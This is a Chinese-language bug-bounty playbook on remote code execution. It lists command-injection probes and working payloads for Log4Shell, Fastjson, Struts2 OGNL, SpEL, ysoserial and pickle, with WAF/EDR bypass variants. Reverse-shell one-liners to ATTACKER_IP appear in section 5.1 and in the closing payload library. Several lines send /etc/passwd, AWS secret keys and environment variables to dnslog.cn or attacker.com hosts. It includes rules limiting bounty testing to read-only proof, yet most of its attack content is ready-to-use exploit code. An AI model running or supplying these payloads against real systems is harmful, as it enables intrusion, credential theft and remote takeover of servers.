# 远程代码执行 (RCE)

> ⚠️ Security notice: examples below may include download-and-execute patterns, shown for defensive understanding and authorized testing only. Never run them against systems you do not own.


> 视角：黑盒，单包打穿是首选；带外回显是无回显场景的救命稻草

## 1. 一句话说清

RCE = 在目标服务器上执行任意命令。
SRC 价值：**所有漏洞类型中最高**，未授权 RCE 通常 $5k–$50k+。
两条路：(a) 命令注入（拼接系统命令）；(b) 反序列化 / 表达式注入（运行时 evaluate）。

---

## 2. 高频入口点（统计 + 类别）

### 2.1 框架 / 中间件类（指纹漏洞）

| 类型 | 案例数 | 入口指纹 |
|------|------|---------|
| Struts2 | 23 | URL 含 `.action`、`.do`，响应 `Server: Apache-Coyote` |
| WebLogic | 5 | 7001 端口 + `/console/` |
| JBoss | 9 | `/jmx-console/`、`/invoker/` |
| Tomcat | 9 | 8080 + `/manager/html` |
| Spring | 4 | `Server: spring`、`X-Application-Context` |
| ElasticSearch | 8 | 9200 + Lucene 1.x |
| Fastjson | - | 响应 / 错误页含 `com.alibaba.fastjson` |
| Log4j | - | 处处可能（任何日志记录的输入点） |
| Redis | 4 | 6379（详见 unauth-access） |
| Jenkins | - | 8080 + `/manage`、`/script` |
| Zabbix | 2 | 80 + `Zabbix SIA` |

### 2.2 命令注入入口（功能特征）

| 功能 | 案例数 | 参数 |
|------|------|------|
| 网络诊断（ping / nslookup / traceroute） | 13 | `host`、`ip`、`target` |
| 文件操作（解压 / 转换） | 34 | `filename`、`path` |
| 图片处理 | 12 | `image`、`file` |
| URL 抓取 | 12 | `url`、`callback` |
| DNS 查询 | 8 | `domain` |
| 备份 / 任务调度 | - | `cmd`、`task`、`job` |

### 2.3 反序列化入口

```
# Java
Cookie / Authorization 含 base64 二进制（rO0AB 开头 = Java 序列化）
ViewState（ASP.NET）
__viewstate / __eventvalidation
sessionid 含 Java 序列化数据

# PHP
unserialize() 接受用户输入（O:8: 开头）
phar:// 协议触发自动反序列化

# Python
pickle.loads() 接受用户输入
yaml.load() 不安全调用

# Ruby
Marshal.load() 接受 cookie / 参数
```

---

## 3. 探测手法

### 3.1 命令注入探针表

```bash
# 拼接符
target=127.0.0.1; id
target=127.0.0.1| id
target=127.0.0.1|| id
target=127.0.0.1 && id
target=127.0.0.1 & id
target=127.0.0.1 `id`
target=127.0.0.1 $(id)
target=127.0.0.1%0aid           # URL 换行
target=127.0.0.1%0d%0aid

# 时间盲（无回显时）
target=127.0.0.1; sleep 5
target=127.0.0.1 && ping -c 5 127.0.0.1
target=127.0.0.1 || sleep 5

# DNSLog 外带
target=127.0.0.1;ping -c 1 `whoami`.xxx.dnslog.cn
target=127.0.0.1;curl `cat /etc/passwd|base64|tr -d '\n'`.xxx.dnslog.cn

# Windows
target=127.0.0.1 & whoami
target=127.0.0.1 | whoami
```

### 3.2 模板注入 / 表达式注入探针

| 技术 | 探针 | 命中后 |
|------|------|------|
| SSTI（Jinja2） | `{{7*7}}` → 49 | `{{config}}`、`{{request.application.__globals__}}` |
| SSTI（Twig） | `{{7*7}}` → 49 | `{{_self.env.registerUndefinedFilterCallback("system")}}` |
| SSTI（Freemarker） | `${7*7}` → 49 | `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` |
| SSTI（Velocity） | `#set($x=7*7)$x` → 49 | Runtime.exec |
| SSTI（Smarty） | `{$smarty.version}` → 显示版本 | `{system('id')}` |
| SpEL（Spring） | `#{7*7}` 或 `${7*7}` | `T(java.lang.Runtime).getRuntime().exec("id")` |
| OGNL（Struts2） | `%{7*7}` | 见 Struts2 表达式 |
| EL（JSP） | `${7*7}` | EL injection 链 |
| JEXL | `7*7` 在 JEXL 上下文 | - |

### 3.3 Log4Shell 通用探针（每个输入点都试）

```
${jndi:ldap://${hostName}.${env:USER}.xxx.dnslog.cn/a}
${jndi:ldap://xxx.dnslog.cn/a}
${jndi:dns://xxx.dnslog.cn/a}    # 不需出网 LDAP，DNS 即可
${jndi:rmi://xxx.dnslog.cn:1099/a}

# 绕过 WAF
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x.dnslog.cn/a}
${${lower:j}ndi:${lower:l}dap://x.dnslog.cn/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//x.dnslog.cn/a}

# 带数据外带
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.x.dnslog.cn/a}
${jndi:ldap://${sys:java.version}.x.dnslog.cn/a}
${jndi:ldap://${env:USER}.x.dnslog.cn/a}
```

**插入点**：每一个**会被记日志**的字段都打：
- `User-Agent`
- `Referer`
- `X-Forwarded-For`
- `X-Api-Version`
- `Cookie`
- 用户名 / 邮箱字段
- 上传文件名
- chat / comment / search 关键词

### 3.4 反序列化探针

```bash
# Java（ysoserial）
java -jar ysoserial-all.jar URLDNS "http://xxx.dnslog.cn"
# 把生成的 base64 放到 Cookie / ViewState / Authorization

# 验证 Java 序列化
echo "input" | base64 -d | xxd | head -1  # security-allowlist: SEC008
# rO0AB 开头 = Java serialized

# 通用 gadget chain（按依赖判断）
ysoserial CommonsCollections1
ysoserial CommonsCollections5
ysoserial CommonsBeanutils1
ysoserial Hibernate1
ysoserial Spring1
ysoserial Jdk7u21        # JDK 自带
```

```bash
# .NET ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc"
```

```python
# Python pickle
import pickle, os, base64
class Exp:
    def __reduce__(self):
        return (os.system, ("curl xxx.dnslog.cn",))
print(base64.b64encode(pickle.dumps(Exp())))
```

### 3.5 Fastjson 探针

```json
{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
{"@type":"java.net.URL","val":"http://xxx.dnslog.cn"}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.dnslog.cn/a","autoCommit":true}
```

### 3.6 Spring4Shell 探针

```
POST /vulnerable
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=test
```

200 + 不报错 = 可能存在；进一步配合 Tomcat AccessLogValve 写 webshell。

### 3.7 OGNL（Struts2）探针

```
S2-045
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data
```

### 3.8 上传 + 解析配合（Webshell）

```
1. 上传图片马（GIF89a + <?php @eval($_POST[c]);?>）→ shell.jpg
2. 利用 Apache 多后缀 / Nginx fix_pathinfo / IIS 解析触发
   - Apache: shell.php.x → 当 PHP 解析
   - Nginx:  shell.jpg/.php → PHP-CGI 处理
   - IIS6:   shell.asp;.jpg → 当 ASP
3. 访问触发 → RCE
```

详见 `playbooks/file-upload.md`。

---

## 4. Bypass 矩阵

完整内容见 `methodology/02-bypass-toolkit.md` 第 4 章。**关键速记**：

| 拦 | 绕 |
|---|---|
| 空格 | `${IFS}`、`${IFS}$9`、`%09`、`{cat,/etc/passwd}`、`<` |
| `cat` 关键字 | `c'a't`、`c\at`、`tac`、`/bin/c?t`、`/???/??t` |
| `;` `\|` | `%0a`、`%0d`、`&&`、`\|\|`、`` ` `` |
| 命令字过滤 | base64：`echo Y2F0IC9ldGMvcGFzc3dk \| base64 -d \| sh` | <!-- security-allowlist: SEC008 -->
| 出网拦截 | DNS 外带（53 几乎不拦） |
| 关键字 `jndi` | `${${lower:j}ndi:...}`、`${${::-j}ndi:...}` |
| 长度限制 | 短链 / shorthand 域名 / `id\|nc x.cc 80` |

---

## 5. 利用提权 / 横向

### 5.1 反弹 shell

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat
nc -e /bin/sh ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Windows PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"  # security-allowlist: SEC005
```

### 5.2 SRC 测试**不要**反弹 shell

仅做以下"无副作用"证明：

```bash
# 验证执行
id
whoami
hostname
uname -a
cat /etc/hostname

# 外带证明
curl https://attacker.cc/?d=$(id|base64)
ping -c 1 $(whoami).xxx.dnslog.cn

# 读取证明（避免敏感数据）
ls /
cat /etc/passwd | head -3
cat /etc/issue
```

**禁止**：`/etc/shadow`、生产数据库连接、写文件、删文件、留 shell。

### 5.3 价值升级链

```
命令注入 (无 root)
  → 读 /etc/passwd, /proc/self/environ
  → 找 ssh key, .bash_history
  → 提权（看是否 root，看 sudo -l，看 SUID）
  → 横向（看 /etc/hosts, ~/.aws/credentials, ~/.docker/config.json）

→ SRC 报告时停在"id 输出 / hostname 输出"即可，不要做提权 / 横向
  除非靶方明确允许"内网测试"
```

---

## 6. 真实案例指纹

### 6.1 Log4Shell (CVE-2021-44228)

| 项目 | 值 |
|------|---|
| 影响版本 | Log4j 2.0 – 2.14.1 |
| 修复版本 | 2.17.0+（2.15 / 2.16 仍有绕过） |
| 黑盒指纹 | 任何被记录的输入点都可能触发 |
| 探针 | `${jndi:dns://x.dnslog.cn/a}`，DNSLog 收到 = 命中 |
| CVSS | 10.0 Critical |

### 6.2 Spring4Shell (CVE-2022-22965)

| 项目 | 值 |
|------|---|
| 触发条件 | JDK 9+ + Spring 5.3.0–5.3.17 / 5.2.0–5.2.19 + WAR 部署 |
| 黑盒指纹 | `class.module.classLoader.resources.context.parent.pipeline.first.pattern=` 不报错 |
| CVSS | 9.8 Critical |

### 6.3 Fastjson 反序列化

| CVE | 版本 | 关键 |
|-----|------|------|
| CVE-2017-18349 | < 1.2.25 | `@type` 直接利用 |
| CVE-2019-12384 | 1.2.25–1.2.47 | 缓存绕过 |
| - | 1.2.48–1.2.67 | 各种 gadget |
| - | 1.2.68–1.2.80 | expectClass 绕过 |
| - | < 1.2.83 | 仍有风险 |

黑盒指纹：响应 / 错误页提到 `fastjson`、`com.alibaba.fastjson`，或 POST JSON 后报特定异常。

探针：
```json
{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
```
DNSLog 收到 = 至少 Fastjson 解析了 `@type`，进一步用 1.2.47 绕过链：

```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
 "b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x/a","autoCommit":true}}
```

### 6.4 Struts2 系列

| CVE | 版本 | 触发 |
|-----|------|------|
| S2-001 | 2.0.0–2.0.8 | OGNL 直接 |
| S2-005 | 2.0.0–2.1.8.1 | `('#'+a)(...)`  |
| S2-009 | 2.1.0–2.3.1.1 | 修复绕过 |
| S2-013 | 2.0.0–2.3.14 | `redirect:`、`action:` |
| S2-016 | 2.0.0–2.3.15 | redirect/action 命令 |
| S2-019 | 2.0.0–2.3.15.1 | 动态方法调用 |
| S2-032 | 2.3.20–2.3.28 | 同上 |
| **S2-045** | 2.3.5–2.3.31 | `Content-Type: %{...}.multipart/form-data` |
| S2-046 | 2.3.5–2.3.31 | Content-Disposition |
| S2-048 | 2.3.x + Struts1 | Struts1 插件 |
| S2-052 | 2.1.2–2.3.33 | REST 插件 XML 反序列化 |
| S2-053 | 2.0.1–2.3.33 | Freemarker |
| S2-057 | 2.0.4–2.3.34 | namespace |

通用探针：
```
POST / HTTP/1.1
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```
响应 Header 出现 `X-Test: 15129` = 命中。

### 6.5 ImageMagick "ImageTragick" (CVE-2016-3714)

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/x/x 0>&1")'
pop graphic-context
```
影响：上传 .mvg / 含 EXIF SVG 触发 ImageMagick 处理时。

### 6.6 FFmpeg HLS SSRF / 文件读

```m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
concat:file:///etc/passwd
#EXT-X-ENDLIST
```

### 6.7 ElasticSearch Groovy (CVE-2014-3120 / 2015-1427)

```json
POST /_search
{"script_fields":{"e":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

### 6.8 ThinkPHP

| 版本 | CVE | 触发 |
|------|-----|------|
| 5.0.0–5.0.23 | CVE-2018-20062 | `?s=captcha` + `_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id` |
| 5.1.x | - | 反序列化 |
| 6.0.x | CVE-2022-38627 | 多语言 RCE |

### 6.9 Jenkins Script Console

```
访问 http://target:8080/script
（如果未授权或弱口令）
> def cmd = "id"
> println cmd.execute().text
```

### 6.10 WebLogic 反序列化

| CVE | 触发 |
|-----|-----|
| CVE-2017-10271 | `/wls-wsat/CoordinatorPortType` SOAP XMLDecoder |
| CVE-2018-2628 | T3 反序列化 |
| CVE-2019-2725 | `/_async/AsyncResponseService` |
| CVE-2020-2551 | IIOP |
| CVE-2020-14882 | 后台 RCE（bypass admin） |

---

## 7. 复现 / 证据要点

### 7.1 报告必备

1. **完整 HTTP 请求 + 响应**
2. **执行证据**：`id` 输出截图、DNSLog 收到记录的截图（含时间、域名、源 IP）
3. **影响断言**：能拿到什么权限（user / root），不要做实际提权
4. **CVSS vector**

### 7.2 DNSLog 证据样式

```
DNSLog 平台：dnslog.cn
监听域名：abcdef.xxx.dnslog.cn

记录：
  Time                     Source IP        Subdomain
  2025-05-09 14:23:11 UTC  3.x.x.x          test.abcdef.xxx.dnslog.cn

源 IP 3.x.x.x 经反查为 target.com 的出口 IP（AWS us-west-2）。
完整日志见附件 dnslog_screenshot.png。
```

### 7.3 命令输出样式

```
请求：
  POST /api/util/ping HTTP/1.1
  ...
  body: {"host":"127.0.0.1; id"}

响应（关键片段）：
  PING 127.0.0.1 ...
  ...
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 7.4 CVSS

```
未授权 RCE     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
认证后 RCE     CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 High
RCE 需用户交互 CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H = 8.8 High
```

### 7.5 影响段示例

```
通过 /api/util/ping 接口的 host 参数，攻击者可注入任意 OS 命令并由 www-data
身份执行。攻击者可：
1. 读取应用配置（/etc/issue、application.properties）；
2. 横向至内网（参考已暴露的 ip route、/etc/hosts 信息）；
3. 在不修复的情况下，可通过 SUID 二进制 / sudo 提权至 root。

测试证据：
- 单包打穿（无需登录）
- 命令 `id` 输出 uid=33(www-data)
- DNSLog 收到带外回显（附件 1）
- 复现 5/5 次
```

---

## 相关 MCP 工具

实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §推荐 profile)。

| 工具 | 域 | 调用时机 |
|---|---|---|
| `mcp__jshook__wasm_disassemble` + `mcp__jshook__wasm_decompile` | wasm | 业务侧 WASM 模块逆向 / 反序列化 sink 定位 |
| `mcp__jshook__antidebug_bypass` | antidebug | 目标主动反调试时先绕过再下断 |
| `mcp__jshook__generate_hooks` + `mcp__jshook__frida_run_script` | binary-instrument | Frida hook 验证 RCE 落点(只读命令) |
| `mcp__jshook__electron_ipc_sniff` | platform | Electron 桌面端 IPC 漏洞观察 |
| `mcp__jshook__mojo_monitor` + `mcp__jshook__syscall_start_monitor` | mojo-ipc / syscall-hook | Chromium 内核漏洞研究 / 系统调用留证 |

完整映射:[`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)

## 8. 不要做的事

- **禁**：在目标上反弹 shell。**只跑只读命令**：`id`、`whoami`、`uname -a`、`cat /etc/issue`。
- **禁**：写入文件 / 留 webshell / 修改任何文件。
- **禁**：尝试本地提权（sudo、SUID 利用、kernel exploit）。
- **禁**：访问 `/etc/shadow`、SSH 私钥、生产数据库凭据。
- **禁**：Log4Shell 之类用 LDAP gadget 实际加载远程类——只用 DNS 外带证明触发即可。
- **禁**：用 ysoserial 实际发起 reverse shell；用 `URLDNS` gadget 仅做出网证明。
- **限速**：单测试 1–2 rps，避免触发风控。
- **报告中**完整的命令输出可以贴，但**主机名 / 内网 IP / 用户名要脱敏**到看不出具体业务。

## H1 真实案例

_共 385 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | 20160 usd | X / xAI | [Potential pre-auth RCE on Twitter VPN](https://hackerone.com/reports/591295) | Hi, we(Orange Tsai and Meh Chang) are the security research team from DEVCORE |
| Critical | 25000 usd | Snapchat | [Exposed Kubernetes API - RCE/Exposed Creds](https://hackerone.com/reports/455645) | Exposed Kubernetes API - RCE/Exposed Creds |
| Critical | 30000 usd | PayPal | [RCE via npm misconfig -- installing internal libraries from the public registry](https://hackerone.com/reports/925585) | RCE via npm misconfig -- installing internal libraries from the public registry |
| Critical | 15000 usd | PlayStation | [Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application](https://hackerone.com/reports/873614) | Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application |
| Critical | 12000 usd | GitLab | [Git flag injection - local file overwrite to remote code execution](https://hackerone.com/reports/658013) | Summary The `wiki_blobs` scope of the Search API can be provided with an arbitrary `ref` parameter, allowing for additional fla… |
| Critical | — | Semrush | [Remote Code Execution on www.semrush.com/my_reports on Logo upload](https://hackerone.com/reports/403417) | The Logo upload in the report constructor at: https://www.semrush.com/my_reports/constructor {F340480} is passed through a not … |
| Critical | 33510 usd | GitLab | [Remote Command Execution via Github import](https://hackerone.com/reports/1679624) | Summary This is very similar to https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/#… |
| Critical | 20000 usd | GitLab | [RCE when removing metadata with ExifTool](https://hackerone.com/reports/1154542) | Summary When uploading image files, GitLab Workhorse passes any files with the extensions jpg/jpeg/tiff through to ExifTool to … |
| Critical | 33510 usd | GitLab | [RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)](https://hackerone.com/reports/1609965) | Summary The `DecompressedArchiveSizeValidator` is used to check the size of a archive before extracting it: https://gitlab.com/… |
| Critical | — | Starbucks | [Webshell via File Upload on ecjobs.starbucks.com.cn](https://hackerone.com/reports/506646) | Summary:** OS Command Injection which can let the attacker who get more important information of the server,such as disclosures… |
| Critical | 12000 usd | GitLab | [Local files could be overwritten in GitLab, leading to remote command execution](https://hackerone.com/reports/587854) | Summary Arbitrary file overwrite A new feature (download a directory of a repository) in GitLab 11.11 introduced some changes i… |
| Critical | 20000 usd | GitLab | [RCE via unsafe inline Kramdown options when rendering certain Wiki pages](https://hackerone.com/reports/1125425) | Summary When rendering wiki content with certain extensions such as `.rmd`, `render_wiki_content` will call `other_markup_unsaf… |

**命中本类的 weakness 分布：**

- Code Injection：138 条
- Command Injection - Generic：101 条
- OS Command Injection：43 条
- Deserialization of Untrusted Data：33 条
- Uncategorized → 手工归类：27 条
- XML External Entities (XXE)：22 条
- Remote File Inclusion：5 条
- Resource Injection：4 条
- Type Confusion：2 条
- Use of Inherently Dangerous Function：2 条
- ASI05: Unexpected Code Execution (RCE)：1 条
- File Content Injection：1 条
- Inclusion of Functionality from Untrusted Control Sphere：1 条
- Leftover Debug Code (Backdoor)：1 条
- Download of Code Without Integrity Check：1 条
- Exposed Dangerous Method or Function：1 条
- XML Entity Expansion：1 条
- Embedded Malicious Code：1 条


## Payload 库

_55 个结构化 web payload，含完整攻击链 + WAF/EDR 绕过变体_

**类别分布：** 框架漏洞 (18) · RCE远程代码执行 (12) · SSTI模板注入 (10) · XXE实体注入 (9) · 供应链攻击 (3) · 原型链污染 (3)

### · 框架漏洞

### Log4j RCE (Log4Shell)  `log4j-rce`
Apache Log4j远程代码执行漏洞
子类：**Log4j** · tags: `log4j` `rce` `cve-2021-44228` `log4shell`

**前置条件：** 使用Log4j 2.x版本；用户输入被记录到日志

**攻击链：**

**1. 1. 探测漏洞**
_探测Log4j漏洞_
```
在任意输入点注入:
${jndi:ldap://attacker.com/test}
观察是否有DNS回调
```

**2. 2. DNS外带测试**
_外带敏感信息_
```
${jndi:ldap://${env:USER}.attacker.com}
${jndi:ldap://${sys:java.version}.attacker.com}
外带环境变量或系统属性
```

**3. 3. 构造恶意LDAP服务器**
_构造RCE payload_
```
使用JNDIExploit或rogue-jndi:
java -jar JNDIExploit.jar -i attacker.com
构造payload:
${jndi:ldap://attacker.com:1389/Basic/Command/base64/d2hvYW1p}
```

**4. 4. 获取Shell**  _[linux]_
_获取反弹Shell_
```
${jndi:ldap://attacker.com:1389/Basic/Command/base64/YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=}
Base64解码为: bash -i >& /dev/tcp/attacker/4444 0>&1
```

**WAF/EDR 绕过变体：**

**1. 绕过关键字过滤**
_使用嵌套表达式绕过_
```
${${lower:j}ndi:ldap://attacker.com}
${${upper:j}ndi:${lower:l}dap://attacker.com}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com}
```

**2. 绕过特殊字符过滤**
_构造协议字符串_
```
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com}
${jndi:dns://attacker.com}
```

---

### Spring Actuator漏洞  `spring-actuator`
Spring Boot Actuator端点安全漏洞
子类：**Spring** · tags: `spring` `actuator` `rce` `java`

**前置条件：** Spring Boot应用；Actuator端点暴露

**攻击链：**

**1. 1. 探测Actuator端点**
_探测暴露的Actuator端点_
```
/actuator
/actuator/env
/actuator/health
/actuator/mappings
/actuator/configprops
/actuator/heapdump
```

**2. 2. 获取敏感信息**
_获取环境变量和配置_
```
/actuator/env
查看数据库密码、API密钥等
/actuator/configprops
查看配置属性
```

**3. 3. 下载堆转储**
_下载并分析堆转储_
```
curl -o heapdump http://target.com/actuator/heapdump
使用Memory Analyzer Tool分析
搜索password、secret等关键词
```

**4. 4. env端点RCE**
_通过env端点执行命令_
```
POST /actuator/env
Content-Type: application/x-www-form-urlencoded
spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('String exec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} return null;}')

POST /actuator/restart
```

**WAF/EDR 绕过变体：**

**1. 路径遍历与分号参数技巧**
_Spring框架的分号路径参数特性允许在URL中插入分号段绕过路径匹配规则，结合双编码和路径穿越访问被限制的Actuator端点_
```
# 分号路径参数绕过(Spring特性):
/;/actuator/env
/actuator;.js/env
/actuator/..;/actuator/env

# 双URL编码:
/%61%63%74%75%61%74%6f%72/env
/actuator/%65%6e%76

# 路径穿越:
/random/../actuator/env
/api/v1/../../actuator/heapdump
```

**2. HTTP方法覆盖与Content-Type绕过**
_使用X-HTTP-Method-Override头覆盖请求方法，或通过非标准Content-Type和大小写变体绕过WAF对Actuator端点的POST请求拦截_
```
# HTTP方法覆盖:
GET /actuator/env HTTP/1.1
X-HTTP-Method-Override: POST

# Content-Type绕过:
POST /actuator/env HTTP/1.1
Content-Type: application/x-www-form-urlencoded
spring.cloud.bootstrap.location=http://attacker.com/payload.yml

# 大小写绕过:
/Actuator/Env
/ACTUATOR/ENV
```

---

### Fastjson RCE  `fastjson-rce`
Alibaba Fastjson反序列化远程代码执行
子类：**Fastjson** · tags: `fastjson` `rce` `deserialization` `java`

**前置条件：** 使用Fastjson库；存在反序列化点

**攻击链：**

**1. 1. 探测Fastjson**
_探测Fastjson版本_
```
发送JSON请求，观察响应:
{"@type":"java.net.Inet4Address","val":"attacker.com"}
观察是否有DNS回调
```

**2. 2. JNDI注入**
_JNDI注入RCE_
```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
```

**3. 3. 搭建恶意服务**
_搭建恶意LDAP/RMI服务_
```
使用JNDIExploit:
java -jar JNDIExploit.jar -i attacker.com
或使用marshalsec:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#Exploit 1389
```

**4. 4. 绕过AutoType检查**
_绕过AutoType黑名单_
```
1.2.47版本绕过:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}
```

**WAF/EDR 绕过变体：**

**1. Unicode编码与嵌套JSON绕过**
_通过Unicode(\u0040)、十六进制(\x40)编码@type字段名或嵌套JSON结构绕过WAF对Fastjson特征的检测_
```
# Unicode编码@type:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# 十六进制编码:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# 嵌套JSON混淆:
{"a":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}
```

**2. BCEL ClassLoader与版本特异链**
_针对不同Fastjson版本使用特异性利用链：BCEL ClassLoader加载字节码、1.2.47缓存投毒、1.2.68 expectClass白名单绕过_
```
# BCEL ClassLoader(Fastjson 1.1.15-1.2.24):
{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader","":"$$BCEL$$$l$8b..."}

# Fastjson 1.2.47 AutoType绕过:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}

# Fastjson 1.2.68 expectClass绕过:
{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

---

### Spring SpEL注入  `spring-spel`
Spring表达式语言注入攻击
子类：**Spring SpEL** · tags: `spring` `spel` `expression` `rce`

**前置条件：** 使用Spring框架；存在SpEL注入点

**攻击链：**

**1. 1. 探测SpEL注入**
_探测SpEL注入点_
```
# 测试表达式执行
${7*7}
#{7*7}
${T(java.lang.Runtime).getRuntime()}

# 观察响应
# 如果返回49或执行成功则存在漏洞
```

**2. 2. 命令执行**
_执行系统命令_
```
# Runtime执行命令
${T(java.lang.Runtime).getRuntime().exec("id")}
#{T(java.lang.Runtime).getRuntime().exec("whoami")}

# ProcessBuilder
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
#{new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}

# 反弹Shell
${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```

**3. 3. 文件读取**
_读取敏感文件_
```
# 读取文件
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream())}

# 使用Scanner
#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream()).useDelimiter("\\A").next()}

# 直接读取
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/etc/passwd"))}
```

**4. 4. DNS外带**
_DNS外带数据_
```
# DNS外带数据
${T(java.net.InetAddress).getByName("attacker.com")}

# 外带文件内容
${T(java.net.InetAddress).getByName(T(java.lang.String).valueOf(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/etc/passwd"))).substring(0,20)+".attacker.com")}
```

